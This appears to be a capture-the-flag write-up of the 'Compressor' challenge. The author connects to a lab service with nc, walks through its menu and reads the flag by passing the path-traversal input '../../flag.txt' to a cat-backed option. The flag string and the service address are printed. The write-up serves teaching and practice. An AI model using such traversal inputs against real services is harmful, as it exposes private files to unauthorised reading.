# Compressor

We are given a docker instance `178.62.119.24:31982`.

```bash
compressor ❯ nc 178.62.119.24 31982

[*] Directory to work in: kzN0NFxM7toZBr7VOVhfKGnxyWnN9kDu

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+
  
[*] Choose component: 2
```

Upon connecting, we are given a few options.

Any option you select, you will be given access to a directory with the same name as in option.

Here I have selected option 3, I can access the directory `p0Dx8LdTffIZJNm92zYLkIzhY1LNM4uX/Hands`.

```bash
[*] Sub-directory to work in: p0Dx8LdTffIZJNm92zYLkIzhY1LNM4uX/Hands                                                                                          
                                                                                                                                                              

Actions:                                                                                                                                                      
                                                                                                                                                              
1. Create artifact                                                                                                                                            
2. List directory    (pwd; ls -la)                                                                                                                            
3. Read artifact     (cat ./<name>)                                                                                                                           
4. Compress artifact (zip <name>.zip <name> <options>)                                                                                                        
5. Change directory  (cd <dirname>)                                                                                                                           
6. Clean directory   (rm -rf ./*)                                                                                                                             
7. Exit                                                                                                                                                       
                                                                                                                                                              
[*] Choose action: 3
```

Now we get another set of options to select from. Here the most interesting option is the third options, as we want to read the flag.

```bash
Actions:                                                                                                                                                      
                                                                                                                                                              
1. Create artifact                                                                                                                                            
2. List directory    (pwd; ls -la)                                                                                                                            
3. Read artifact     (cat ./<name>)                                                                                                                           
4. Compress artifact (zip <name>.zip <name> <options>)                                                                                                        
5. Change directory  (cd <dirname>)                                                                                                                           
6. Clean directory   (rm -rf ./*)                                                                                                                             
7. Exit                                                                                                                                                       
                                                                                                                                                              
[*] Choose action: 3

Insert name you want to read: flag.txt
cat: can't open 'flag.txt': No such file or directory
```

I have given a file called `flag.txt` which in most cases contains the flag, as an input to option 3 to read the contents. 

If we look at the error message, we can see that the service is using the `cat` command to read the file. If the server is not validating dangerous characters like directory traversal characters, we can read any arbitrary file from the server file system.

```bash
Actions:                                                                                                                                                      
                                                                                                                                                              
1. Create artifact                                                                                                                                            
2. List directory    (pwd; ls -la)                                                                                                                            
3. Read artifact     (cat ./<name>)                                                                                                                           
4. Compress artifact (zip <name>.zip <name> <options>)                                                                                                        
5. Change directory  (cd <dirname>)                                                                                                                           
6. Clean directory   (rm -rf ./*)                                                                                                                             
7. Exit                                                                                                                                                       
                                                                                                                                                              
[*] Choose action: 3

Insert name you want to read: ../../flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
```

After 2 sets of traversal, we can get the contents of the flag.

That is all in this challenge 🙂